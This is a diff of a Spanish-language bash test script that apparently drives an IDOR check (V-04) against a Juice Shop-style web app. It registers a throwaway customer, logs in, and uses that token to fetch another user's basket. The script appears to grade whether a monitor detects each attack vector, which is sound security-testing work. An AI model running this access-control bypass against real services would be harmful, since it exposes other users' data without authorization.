@@ -153,17 +153,22 @@ echo; echo "[V-04] IDOR  registrar customer -> GET /rest/basket/$TARGET_BASKET c
 d="$EVID/V-04-idor-basket"; mkdir -p "$d"
 em="idor.$(date +%s)@example.com"
 printf '{"email":"%s","password":"Passw0rd!","passwordRepeat":"Passw0rd!","securityQuestion":{"id":1},"securityAnswer":"x"}' "$em" > "$d/registro.json"
-curl -s -A "$RUN-V04" -X POST "$BASE_URL/api/Users/" -H 'Content-Type: application/json' --data @"$d/registro.json" -o "$d/registro-resp.json" >/dev/null
+reg_code=$(curl -s -A "$RUN-V04" -X POST "$BASE_URL/api/Users/" -H 'Content-Type: application/json' --data @"$d/registro.json" -o "$d/registro-resp.json" -w '%{http_code}')
 printf '{"email":"%s","password":"Passw0rd!"}' "$em" > "$d/login.json"
-curl -s -A "$RUN-V04" -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data @"$d/login.json" -o "$d/login-resp.json" >/dev/null
-ctok=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('token',''))" 2>/dev/null || true)
-mybid=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('bid',''))" 2>/dev/null || true)
-if [ -n "${ctok:-}" ]; then
+login_code=$(curl -s -A "$RUN-V04" -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data @"$d/login.json" -o "$d/login-resp.json" -w '%{http_code}')
+echo "  -> registro: HTTP $reg_code · login: HTTP $login_code"
+pyerr="$d/token-extraction.err"
+ctok=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('token',''))" 2>"$pyerr")
+mybid=$(python3 -c "import json;print(json.load(open('$d/login-resp.json')).get('authentication',{}).get('bid',''))" 2>>"$pyerr")
+[ -s "$pyerr" ] || rm -f "$pyerr"
+if [ "$login_code" = "200" ] && [ -n "${ctok:-}" ]; then
   code=$(curl -s -A "$RUN-V04" "$BASE_URL/rest/basket/$TARGET_BASKET" -H "Authorization: Bearer $ctok" -o "$d/basket-ajeno.json" -w '%{http_code}')
   owner=$(python3 -c "import json;print(json.load(open('$d/basket-ajeno.json')).get('data',{}).get('UserId',''))" 2>/dev/null || true)
   echo "  -> HTTP $code  (mi carrito bid=$mybid; carrito $TARGET_BASKET dueño UserId=$owner)"
 else
-  code="n/d"; echo "  -> no se pudo obtener token de customer (code registro/login); revisar $d"
+  code="n/d"
+  echo "  -> no se pudo obtener token de customer: registro=$reg_code login=$login_code"
+  echo "     revisar $d/registro-resp.json, $d/login-resp.json${pyerr:+ y $pyerr si existe}"
 fi
 echo "$code" > "$d/http_code.txt"
 IDS+=("V-04"); VECT+=("IDOR carrito"); SEES+=("No (petición legítima)"); OBS+=("$code"); verdict_blind "$code"
